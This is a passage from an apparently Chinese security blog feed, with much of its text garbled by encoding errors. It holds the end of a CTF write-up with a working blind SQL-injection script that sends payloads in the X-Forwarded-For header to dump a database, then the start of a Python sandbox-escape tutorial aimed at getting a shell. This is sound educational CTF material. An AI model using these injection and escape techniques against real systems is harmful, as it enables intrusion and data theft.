headers={&apos;X-Forwarded-For&apos;: payload})        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})        start_pos = r.text.find(&quot;Last Ip: &quot;)        end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)        result = int(r.text[start_pos + 9: end_pos])        return_result += bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;)        print(&quot;[+]ä½ç½® &quot; + str(i) + &quot; è¯·æ±‚äº”ä½æˆåŠŸ:&quot; + bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;))    return return_result# è·å–æ•°æ®åº“print(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&quot;))# è·å–æ•°æ®åº“è¡¨print(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos;&quot;))# è·å–æ•°æ®åº“è¡¨print(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos; AND TABLE_NAME = &apos;F4l9_t4b1e&apos; &quot;))# è·å–è¡¨ä¸­å†…å®¹print(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&quot;))</code></pre><p>è¿™é‡Œç”¨çš„æ˜¯ <code>1&#39;|&#39;1&#39;|&#39;1</code> ç„¶åå¼‚æˆ–ä¹Ÿå¯ä»¥ <code>1&#39;^&#39;0&#39;^&#39;1</code></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><blockquote><p><a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/" target="_blank" rel="noopener">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p><p><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/213359.html</a></p><p><a href="https://paper.seebug.org/1048/#32-cl-cl" target="_blank" rel="noopener">https://paper.seebug.org/1048/#32-cl-cl</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythonæ²™ç›’é€ƒé€¸:ä»å¤´å¼€å§‹</title>
      <link href="/2019/10/11/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2019/10/11/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<p>10/11/2019 2:26:44 PM </p><h1 id="Python-æ²™ç®±é€ƒé€¸ä½ çœŸçš„çœ‹æ‡‚äº†ä¹ˆï¼Ÿ"><a href="#Python-æ²™ç®±é€ƒé€¸ä½ çœŸçš„çœ‹æ‡‚äº†ä¹ˆï¼Ÿ" class="headerlink" title="Python æ²™ç®±é€ƒé€¸ä½ çœŸçš„çœ‹æ‡‚äº†ä¹ˆï¼Ÿ"></a>Python æ²™ç®±é€ƒé€¸ä½ çœŸçš„çœ‹æ‡‚äº†ä¹ˆï¼Ÿ</h1><p>python æ²™ç®±é€ƒé€¸å°±æ˜¯åœ¨ä¸€ä¸ªè¢«ä¸¥æ ¼é™åˆ¶äº† python æ‰§è¡Œç¯å¢ƒä¸­è·å–æ›´é«˜çš„æƒé™ï¼Œç”šè‡³ getshell ,è¿™æ˜¯æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„ã€‚ä½†æ˜¯åœ¨è¿™ä¹‹å‰æˆ‘ä»¬éœ€è¦ç»•è¿‡å„ç§é™åˆ¶ã€‚</p><p>ç”±äºç¯å¢ƒä¸­é™åˆ¶äº†è®¸å¤šæ•æ„Ÿæ¨¡å—æ¯”å¦‚ os ã€ sys ï¼Œäºæ˜¯æˆ‘ä»¬çš„é‡ç‚¹å˜æˆäº†å¦‚ä½•ç»•è¿‡é™åˆ¶å»å¼•å…¥èƒ½æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„æ“ä½œçš„æ¨¡å—ã€‚</p><p>æ¥ä¸‹æ¥è®©æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹ python çš„ä¸¤ä¸ªéå¸¸é‡è¦çš„ä¸œè¥¿</p><h2 id="type-amp-object"><a href="#type-amp-object" class="headerlink" title="type &amp; object"></a>type &amp; object</h2><p>åœ¨ python é‡Œè¦æŸ¥çœ‹ä¸€ä¸ªç±»å‹çš„çˆ¶ç±»ï¼Œä½¿ç”¨å®ƒçš„ <strong>base</strong> å±æ€§æŸ¥çœ‹ã€‚  åœ¨ python é‡ŒæŸ¥çœ‹ä¸€ä¸ªå®ä¾‹çš„ç±»å‹ï¼Œä½¿ç”¨å®ƒçš„ <strong>class</strong> å±æ€§å¯ä»¥æŸ¥çœ‹ï¼Œæˆ–è€…ä½¿ç”¨ type() å‡½æ•°æŸ¥çœ‹ã€‚</p><pre><code>&gt;&gt;&gt; object&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; type&lt;type &apos;type&apos;&gt;</code></pre><p>ä»–ä»¬éƒ½æ˜¯ type çš„ä¸€ä¸ªå®ä¾‹ï¼Œè¡¨ç¤ºä»–ä»¬éƒ½æ˜¯ç±»å‹å¯¹è±¡ã€‚</p><p>Python ä¸­ï¼Œ object æ˜¯çˆ¶å­å…³ç³»çš„é¡¶ç«¯ï¼Œæ‰€æœ‰æ•°æ®ç±»å‹çš„çˆ¶ç±»éƒ½æ˜¯å®ƒï¼› type æ˜¯ç±»å‹å®ä¾‹å…³ç³»çš„é¡¶ç«¯ï¼Œæ‰€æœ‰å¯¹è±¡éƒ½æ˜¯å®ƒçš„å®ä¾‹ï¼Œä»–ä»¬çš„å…³ç³»å¯ä»¥æè¿°ä¸º: object æ˜¯ä¸€ä¸ª type (object is a instance of type)ï¼Œå³ Object æ˜¯ type çš„ä¸€ä¸ªå®ä¾‹ã€‚</p><pre><code>&gt;&gt;&gt; object.__class__&lt;type &apos;type&apos;&gt;&gt;&gt;&gt; object.__bases__  #ç«™åœ¨é£Ÿç‰©é“¾é¡¶ç«¯çš„ç”·äººï¼Œæ²¡æœ‰çˆ¶ç±»()&gt;&gt;&gt; type.__bases__(&lt;type &apos;object&apos;&gt;,)&gt;&gt;&gt; type.__class__    #type çš„ç±»å‹æ˜¯è‡ªå·±&lt;type &apos;type&apos;&gt;</code></pre><p>æˆ‘ä»¬å†å°è¯•å¼•å…¥ä¸€äº›å†…ç½®æ•°æ®ç±»å‹æ¥çœ‹çœ‹ï¼š</p><pre><code>&gt;&gt;&gt; list.__bases__(&lt;type &apos;object&apos;&gt;,)&gt;&gt;&gt; type.__class__&lt;type &apos;type&apos;&gt;&gt;&gt;&gt; dict.__bases__(&lt;type &apos;object&apos;&gt;,)&gt;&gt;&gt; dict.__class__&lt;type &apos;type&apos;&gt;</code></pre><p><strong>ä»–ä»¬çš„çˆ¶ç±»éƒ½æ˜¯ object , ç±»å‹éƒ½æ˜¯ type</strong>ï¼Œè¿™ç‚¹å¾ˆé‡è¦ï¼</p><p>æˆ‘ä»¬æŠŠä»–ä»¬æ”¾åœ¨ä¸€ä¸ªè¡¨é‡Œçœ‹çœ‹ï¼š</p><p><img src="https://pic2.zhimg.com/80/dcfa446418490a973b8dd47e83c181a8_hd.jpg" alt></p><p>ç™½æ¿ä¸Šçš„è™šçº¿è¡¨ç¤ºæºæ˜¯ç›®æ ‡çš„å®ä¾‹ï¼Œå®çº¿è¡¨ç¤ºæºæ˜¯ç›®æ ‡çš„å­ç±»ã€‚å³ï¼Œå·¦è¾¹çš„æ˜¯å³è¾¹çš„ç±»å‹ï¼Œè€Œä¸Šé¢çš„æ˜¯ä¸‹é¢çš„çˆ¶äº²ã€‚</p><h2 id="builtinã€builtinsã€builtins-æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#builtinã€builtinsã€builtins-æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="builtinã€builtinsã€builtins æ˜¯ä»€ä¹ˆï¼Ÿ"></a><strong>builtin</strong>ã€<strong>builtins</strong>ã€builtins æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>python ä¸­æœ‰ä¸€ä¸ªå†…å»ºæ¨¡å—ï¼Œè¯¥æ¨¡å—ä¸­æœ‰ä¸€äº›å¸¸ç”¨å‡½æ•°ï¼›è€Œè¯¥æ¨¡å—åœ¨ Python å¯åŠ¨ä¹‹åã€ä¸”æ²¡æœ‰æ‰§è¡Œä»»ä½•ä»£ç ä¹‹å‰ï¼Œpython ä¼šé¦–å…ˆåŠ è½½è¯¥å†…å»ºå‡½æ•°åˆ°å†…å­˜ä¸­ã€‚å¦å¤–ï¼Œè¯¥å†…å»ºå‡½æ•°ä¸­çš„åŠŸèƒ½å¯ä»¥ç›´æ¥ä½¿ç”¨ä¸éœ€è¦æ·»åŠ ä»»ä½•å†…å»ºæ¨¡å—å‰ç¼€ï¼Œå…¶åŸå› æ˜¯å¯¹å‡½æ•°ã€å˜é‡ã€ç±»ç­‰æ ‡è¯†ç¬¦çš„æŸ¥æ‰¾æ˜¯æŒ‰ç…§ LE(N)GB çš„è§„åˆ™</p><pre><code>locals -&gt; enclosing function -&gt; globals -&gt; builtins</code></pre><p>åœ¨ Python2.x ç‰ˆæœ¬ä¸­ï¼Œå†…å»ºæ¨¡å—è¢«å‘½ä¸º <code>__builtin__</code> , è€Œåˆ°äº† Python3.x ç‰ˆæœ¬æ›´åä¸º <code>builtins</code> .</p><p>å½“ä½¿ç”¨å†…å»ºæ¨¡å—ä¸­å‡½æ•°æˆ–å…¶å®ƒåŠŸèƒ½æ—¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¸ç”¨æ·»åŠ å†…å»ºæ¨¡å—çš„åå­—;ä½†æ˜¯ï¼Œå¦‚æœæƒ³è¦å‘å†…å»ºæ¨¡å—ä¸­æ·»åŠ ä¸€äº›åŠŸèƒ½ï¼Œä»¥ä¾¿åœ¨ä»»ä½•å‡½æ•°ä¸­éƒ½èƒ½ç›´æ¥ä½¿ç”¨è€Œä¸ ç”¨å†è¿›è¡Œimportï¼Œè¿™æ—¶ï¼Œå°±è¦å¯¼å…¥å†…å»ºæ¨¡å—ï¼Œåœ¨å†…å»ºæ¨¡å—çš„å‘½åç©ºé—´(å³ <strong>dict</strong> å­—å…¸å±æ€§)ä¸­æ·»åŠ è¯¥åŠŸèƒ½ã€‚åœ¨å¯¼å…¥æ—¶ï¼Œå¦‚æœæ˜¯ Python2.X ç‰ˆæœ¬ï¼Œå°±è¦å¯¼å…¥ <code>__builtin__</code> æ¨¡å—;å¦‚æœæ˜¯ Python3.Xç‰ˆæœ¬ï¼Œå°±è¦å¯¼å…¥builtins æ¨¡å—ã€‚å¦‚ï¼šåœ¨ Python2.X ä¸­ï¼Œå‘å†…å»ºæ¨¡å—æ·»åŠ  ä¸€ä¸ªå‡½æ•°(è¯¥å‡½æ•°æ‰“å° â€œhello, worldâ€ )ï¼Œå¯ä»¥è¿™æ ·å†™</p><pre><code>&gt;&gt;&gt; import __builtin__&gt;&gt;&gt; def print_hello():...     print &quot;hello world!&quot;...&gt;&gt;&gt; __builtin__.__dict__[&apos;hello&apos;]=print_hello&gt;&gt;&gt; print_hello()hello world!&gt;&gt;&gt; hello()hello world!</code></pre><p>æ­¤æ—¶ï¼Œ <code>print_hello</code> å’Œ <code>hello</code> ä¸¤ä¸ªå‡½æ•°åå‡ ä¹æ˜¯ä¸€æ ·ï¼Œä½†æ˜¯æœ‰ä¸€ç‚¹åŒºåˆ«ï¼Œ<code>print_hello</code>åªèƒ½åœ¨è¯¥æ¨¡å—ä¸­ä½¿ç”¨ï¼Œè€Œ <code>hello</code> å¯ä»¥åœ¨æœ¬ç¨‹åºä¸­çš„å…¶å®ƒä»»ä½•ä¸€ä¸ªæ¨¡å—ä¸­ä½¿ç”¨ï¼Œå› ä¸º <code>hello</code> å·²ç»æ”¾åˆ°å†…å»ºæ¨¡å—ä¸­äº†ã€‚</p><p>è¯´å®Œäº† <code>__builtin__</code> å’Œ <code>builtin</code> ,é‚£ <code>__builtins__</code> æ˜¯ä»€ä¹ˆï¼Ÿ</p><p><code>__builtins__</code> å³æ˜¯å¼•ç”¨ï¼Œä¹Ÿæ˜¯åœ¨ä»£ç è¿è¡Œä¹‹å‰è¢«åŠ è½½åˆ°å†…å­˜ä¸­ã€‚ä½†æ˜¯å®ƒä»¬è¿˜æœ‰ä¸€ç‚¹åŒºåˆ«ï¼š</p><ol><li>æ— è®ºä»»ä½•åœ°æ–¹è¦æƒ³ä½¿ç”¨å†…å»ºæ¨¡å—ï¼Œéƒ½å¿…é¡»åœ¨è¯¥ä½ç½®æ‰€å¤„çš„ä½œç”¨åŸŸä¸­å¯¼å…¥ <code>__builtin__</code> å†…å»ºæ¨¡å—;è€Œå¯¹äº <code>__builtins__</code> å´ä¸ç”¨å¯¼å…¥ï¼Œå®ƒåœ¨ä»»ä½•æ¨¡å—éƒ½ç›´æ¥å¯è§</li><li>åœ¨ä¸»æ¨¡å— <code>__main__</code> ä¸­ <code>__builtins__</code> æ˜¯å¯¹å†…å»ºæ¨¡å— <code>__builtin__</code> æœ¬èº«çš„å¼•ç”¨ï¼Œå³ <code>__builtins__</code> å®Œå…¨ç­‰ä»·äº <code>__builtin__</code> ï¼ŒäºŒè€…å®Œå…¨æ˜¯ä¸€ä¸ªä¸œè¥¿ï¼Œä¸åˆ†å½¼æ­¤ï¼›åœ¨éä¸»æ¨¡å—ä¸­ <code>__builtins__</code> ä»…æ˜¯å¯¹ <code>__builtin__</code> . <code>__dict__</code> çš„å¼•ç”¨ï¼Œè€Œé<code>__builtin__</code> æœ¬èº«ã€‚å®ƒåœ¨ä»»ä½•åœ°æ–¹éƒ½å¯è§ã€‚æ­¤æ—¶ <code>__builtins__</code> çš„ç±»å‹æ˜¯å­—å…¸ã€‚</li></ol><p>æˆ‘ä»¬æ‰“å¼€ IDLE çœ‹çœ‹è¿™é‡Œé¢éƒ½æœ‰ä»€ä¹ˆä¸œè¥¿å§(Python 2.7)ã€‚</p><pre><code>&gt;&gt;&gt; dir(__builtins__)[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;WindowsError&apos;, &apos;ZeroDivisionError&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;]</code></pre><p>æˆ‘ä»¬çœ‹åˆ°äº†å¸¸ç”¨çš„ <code>__import__</code> ã€ <code>bin</code> ã€ <code>eval</code> ç­‰å‘½ä»¤</p><p>å¥½äº†ï¼Œç°åœ¨æˆ‘ä»¬å·²ç»å¤§è‡´ä¸ŠçŸ¥é“äº†å„ä¸ªæ¨¡å—ä¹‹é—´çš„å…³ç³»äº†ï¼</p><h2 id="Python-æœ‰å“ªäº›å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‘¢ï¼Ÿ"><a href="#Python-æœ‰å“ªäº›å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‘¢ï¼Ÿ" class="headerlink" title="Python æœ‰å“ªäº›å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‘¢ï¼Ÿ"></a>Python æœ‰å“ªäº›å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‘¢ï¼Ÿ</h2><p>os  commands  subprocess  timeit  platform  pty â€¦</p><p>æ¬è¿ä¸€ä¸ªæµ‹è¯•æ‰€æœ‰å¯¼å…¥ os æˆ–è€… sys çš„åº“çš„è„šæœ¬ï¼š</p><pre><code>#-*- coding:utf8 -*-# By Macr0phag3# in 2019-05-07 19:46:12# ------------------------------------# this, antigravity åº“åˆ æ‰all_modules_2 = [    &apos;BaseHTTPServer&apos;, &apos;imaplib&apos;, &apos;shelve&apos;, &apos;Bastion&apos;, &apos;anydbm&apos;, &apos;imghdr&apos;, &apos;shlex&apos;, &apos;CDROM&apos;, &apos;argparse&apos;, &apos;imp&apos;, &apos;shutil&apos;, &apos;CGIHTTPServer&apos;, &apos;array&apos;, &apos;importlib&apos;, &apos;signal&apos;, &apos;Canvas&apos;, &apos;ast&apos;, &apos;imputil&apos;, &apos;site&apos;, &apos;ConfigParser&apos;, &apos;asynchat&apos;, &apos;inspect&apos;, &apos;sitecustomize&apos;, &apos;Cookie&apos;, &apos;asyncore&apos;, &apos;io&apos;, &apos;smtpd&apos;, &apos;DLFCN&apos;, &apos;atexit&apos;, &apos;itertools&apos;, &apos;smtplib&apos;, &apos;Dialog&apos;, &apos;audiodev&apos;, &apos;json&apos;, &apos;sndhdr&apos;, &apos;DocXMLRPCServer&apos;, &apos;audioop&apos;, &apos;keyword&apos;, &apos;socket&apos;, &apos;FileDialog&apos;, &apos;base64&apos;, &apos;lib2to3&apos;, &apos;spwd&apos;, &apos;FixTk&apos;, &apos;bdb&apos;, &apos;linecache&apos;, &apos;sqlite3&apos;, &apos;HTMLParser&apos;, &apos;binascii&apos;, &apos;linuxaudiodev&apos;, &apos;sre&apos;, &apos;IN&apos;, &apos;binhex&apos;, &apos;locale&apos;, &apos;sre_compile&apos;, &apos;MimeWriter&apos;, &apos;bisect&apos;, &apos;logging&apos;, &apos;sre_constants&apos;, &apos;Queue&apos;, &apos;bsddb&apos;, &apos;lsb_release&apos;, &apos;sre_parse&apos;, &apos;ScrolledText&apos;, &apos;bz2&apos;, &apos;macpath&apos;, &apos;ssl&apos;, &apos;SimpleDialog&apos;, &apos;cPickle&apos;, &apos;macurl2path&apos;, &apos;stat&apos;, &apos;SimpleHTTPServer&apos;, &apos;cProfile&apos;, &apos;mailbox&apos;, &apos;statvfs&apos;, &apos;SimpleXMLRPCServer&apos;, &apos;cStringIO&apos;, &apos;mailcap&apos;, &apos;string&apos;, &apos;SocketServer&apos;, &apos;calendar&apos;, &apos;markupbase&apos;, &apos;stringold&apos;, &apos;StringIO&apos;, &apos;cgi&apos;, &apos;marshal&apos;, &apos;stringprep&apos;, &apos;TYPES&apos;, &apos;cgitb&apos;, &apos;math&apos;, &apos;strop&apos;, &apos;Tix&apos;, &apos;chunk&apos;, &apos;md5&apos;, &apos;struct&apos;, &apos;Tkconstants&apos;, &apos;cmath&apos;, &apos;mhlib&apos;, &apos;subprocess&apos;, &apos;Tkdnd&apos;, &apos;cmd&apos;, &apos;mimetools&apos;, &apos;sunau&apos;, &apos;Tkinter&apos;, &apos;code&apos;, &apos;mimetypes&apos;, &apos;sunaudio&apos;, &apos;UserDict&apos;, &apos;codecs&apos;, &apos;mimify&apos;, &apos;symbol&apos;, &apos;UserList&apos;, &apos;codeop&apos;, &apos;mmap&apos;, &apos;symtable&apos;, &apos;UserString&apos;, &apos;collections&apos;, &apos;modulefinder&apos;, &apos;sys&apos;, &apos;_LWPCookieJar&apos;, &apos;colorsys&apos;, &apos;multifile&apos;, &apos;sysconfig&apos;, &apos;_MozillaCookieJar&apos;, &apos;commands&apos;, &apos;multiprocessing&apos;, &apos;syslog&apos;, &apos;__builtin__&apos;, &apos;compileall&apos;, &apos;mutex&apos;, &apos;tabnanny&apos;, &apos;__future__&apos;, &apos;compiler&apos;, &apos;netrc&apos;, &apos;talloc&apos;, &apos;_abcoll&apos;, &apos;contextlib&apos;, &apos;new&apos;, &apos;tarfile&apos;, &apos;_ast&apos;, &apos;cookielib&apos;, &apos;nis&apos;, &apos;telnetlib&apos;, &apos;_bisect&apos;, &apos;copy&apos;, &apos;nntplib&apos;, &apos;tempfile&apos;, &apos;_bsddb&apos;, &apos;copy_reg&apos;, &apos;ntpath&apos;, &apos;termios&apos;, &apos;_codecs&apos;, &apos;crypt&apos;, &apos;nturl2path&apos;, &apos;test&apos;, &apos;_codecs_cn&apos;, &apos;csv&apos;, &apos;numbers&apos;, &apos;textwrap&apos;, &apos;_codecs_hk&apos;, &apos;ctypes&apos;, &apos;opcode&apos;, &apos;_codecs_iso2022&apos;, &apos;curses&apos;, &apos;operator&apos;, &apos;thread&apos;, &apos;_codecs_jp&apos;, &apos;datetime&apos;, &apos;optparse&apos;, &apos;threading&apos;, &apos;_codecs_kr&apos;, &apos;dbhash&apos;, &apos;os&apos;, &apos;time&apos;, &apos;_codecs_tw&apos;, &apos;dbm&apos;, &apos;os2emxpath&apos;, &apos;timeit&apos;, &apos;_collections&apos;, &apos;decimal&apos;, &apos;ossaudiodev&apos;, &apos;tkColorChooser&apos;, &apos;_csv&apos;, &apos;difflib&apos;, &apos;parser&apos;, &apos;tkCommonDialog&apos;, &apos;_ctypes&apos;, &apos;dircache&apos;, &apos;pdb&apos;, &apos;tkFileDialog&apos;, &apos;_ctypes_test&apos;, &apos;dis&apos;, &apos;pickle&apos;, &apos;tkFont&apos;, &apos;_curses&apos;, &apos;distutils&apos;, &apos;pickletools&apos;, &apos;tkMessageBox&apos;, &apos;_curses_panel&apos;, &apos;doctest&apos;, &apos;pipes&apos;, &apos;tkSimpleDialog&apos;, &apos;_elementtree&apos;, &apos;dumbdbm&apos;, &apos;pkgutil&apos;, &apos;toaiff&apos;, &apos;_functools&apos;, &apos;dummy_thread&apos;, &apos;platform&apos;, &apos;token&apos;, &apos;_hashlib&apos;, &apos;dummy_threading&apos;, &apos;plistlib&apos;, &apos;tokenize&apos;, &apos;_heapq&apos;, &apos;email&apos;, &apos;popen2&apos;, &apos;trace&apos;, &apos;_hotshot&apos;, &apos;encodings&apos;, &apos;poplib&apos;, &apos;traceback&apos;, &apos;_io&apos;, &apos;ensurepip&apos;, &apos;posix&apos;, &apos;ttk&apos;, &apos;_json&apos;, &apos;errno&apos;, &apos;posixfile&apos;, &apos;tty&apos;, &apos;_locale&apos;, &apos;exceptions&apos;, &apos;posixpath&apos;, &apos;turtle&apos;, &apos;_lsprof&apos;, &apos;fcntl&apos;, &apos;pprint&apos;, &apos;types&apos;, &apos;_md5&apos;, &apos;filecmp&apos;, &apos;profile&apos;, &apos;unicodedata&apos;, &apos;_multibytecodec&apos;, &apos;fileinput&apos;, &apos;pstats&apos;, &apos;unittest&apos;, &apos;_multiprocessing&apos;, &apos;fnmatch&apos;, &apos;pty&apos;, &apos;urllib&apos;, &apos;_osx_support&apos;, &apos;formatter&apos;, &apos;pwd&apos;, &apos;urllib2&apos;, &apos;_pyio&apos;, &apos;fpformat&apos;, &apos;py_compile&apos;, &apos;urlparse&apos;, &apos;_random&apos;, &apos;fractions&apos;, &apos;pyclbr&apos;, &apos;user&apos;, &apos;_sha&apos;, &apos;ftplib&apos;, &apos;pydoc&apos;, &apos;uu&apos;, &apos;_sha256&apos;, &apos;functools&apos;, &apos;pydoc_data&apos;, &apos;uuid&apos;, &apos;_sha512&apos;, &apos;future_builtins&apos;, &apos;pyexpat&apos;, &apos;warnings&apos;, &apos;_socket&apos;, &apos;gc&apos;, &apos;quopri&apos;, &apos;wave&apos;, &apos;_sqlite3&apos;, &apos;genericpath&apos;, &apos;random&apos;, &apos;weakref&apos;, &apos;_sre&apos;, &apos;getopt&apos;, &apos;re&apos;, &apos;webbrowser&apos;, &apos;_ssl&apos;, &apos;getpass&apos;, &apos;readline&apos;, &apos;whichdb&apos;, &apos;_strptime&apos;, &apos;gettext&apos;, &apos;repr&apos;, &apos;wsgiref&apos;, &apos;_struct&apos;, &apos;glob&apos;, &apos;resource&apos;, &apos;xdrlib&apos;, &apos;_symtable&apos;, &apos;grp&apos;, &apos;rexec&apos;, &apos;xml&apos;, &apos;_sysconfigdata&apos;, &apos;gzip&apos;, &apos;rfc822&apos;, &apos;xmllib&apos;, &apos;_sysconfigdata_nd&apos;, &apos;hashlib&apos;, &apos;rlcompleter&apos;, &apos;xmlrpclib&apos;, &apos;_testcapi&apos;, &apos;heapq&apos;, &apos;robotparser&apos;, &apos;xxsubtype&apos;, &apos;_threading_local&apos;, &apos;hmac&apos;, &apos;runpy&apos;, &apos;zipfile&apos;, &apos;_warnings&apos;, &apos;hotshot&apos;, &apos;sched&apos;, &apos;zipimport&apos;, &apos;_weakref&apos;, &apos;htmlentitydefs&apos;, &apos;select&apos;, &apos;zlib&apos;, &apos;_weakrefset&apos;, &apos;htmllib&apos;, &apos;sets&apos;, &apos;abc&apos;, &apos;httplib&apos;, &apos;sgmllib&apos;, &apos;aifc&apos;, &apos;ihooks&apos;, &apos;sha&apos;]all_modules_3 = [    &apos;AptUrl&apos;, &apos;hmac&apos;, &apos;requests_unixsocket&apos;, &apos;CommandNotFound&apos;, &apos;apport&apos;, &apos;hpmudext&apos;, &apos;resource&apos;, &apos;Crypto&apos;, &apos;apport_python_hook&apos;, &apos;html&apos;, &apos;rlcompleter&apos;, &apos;DistUpgrade&apos;, &apos;apt&apos;, &apos;http&apos;, &apos;runpy&apos;, &apos;HweSupportStatus&apos;, &apos;apt_inst&apos;, &apos;httplib2&apos;, &apos;scanext&apos;, &apos;LanguageSelector&apos;, &apos;apt_pkg&apos;, &apos;idna&apos;, &apos;sched&apos;, &apos;NvidiaDetector&apos;, &apos;aptdaemon&apos;, &apos;imaplib&apos;, &apos;secrets&apos;, &apos;PIL&apos;, &apos;aptsources&apos;, &apos;imghdr&apos;, &apos;secretstorage&apos;, &apos;Quirks&apos;, &apos;argparse&apos;, &apos;imp&apos;, &apos;select&apos;, &apos;UbuntuDrivers&apos;, &apos;array&apos;, &apos;importlib&apos;, &apos;selectors&apos;, &apos;UbuntuSystemService&apos;, &apos;asn1crypto&apos;, &apos;inspect&apos;, &apos;shelve&apos;, &apos;UpdateManager&apos;, &apos;ast&apos;, &apos;io&apos;, &apos;shlex&apos;, &apos;__future__&apos;, &apos;asynchat&apos;, &apos;ipaddress&apos;, &apos;shutil&apos;, &apos;_ast&apos;, &apos;asyncio&apos;, &apos;itertools&apos;, &apos;signal&apos;, &apos;_asyncio&apos;, &apos;asyncore&apos;, &apos;janitor&apos;, &apos;simplejson&apos;, &apos;_bisect&apos;, &apos;atexit&apos;, &apos;json&apos;, &apos;site&apos;, 